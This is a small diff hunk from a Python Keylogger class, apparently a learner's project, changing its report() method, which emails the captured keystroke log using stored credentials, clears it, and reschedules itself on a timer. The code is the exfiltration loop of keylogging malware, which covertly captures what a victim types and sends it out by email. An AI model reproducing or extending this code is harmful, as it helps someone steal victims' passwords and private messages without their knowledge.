@@ -31,7 +31,7 @@ class Keylogger: #class names start with capital letter conventionally
 
     def report(self):
         #print(self.log)
-        self.send_email(self.email, self.password, self.log)
+        self.send_email(self.email, self.password, "\n\n" + self.log)
         self.log = " "
         timer = threading.Timer(self.interval, self.report) #recursive function - report calls itself
         #replace hardcoded int time with self.interval - instantiated number invoked when passed in from user
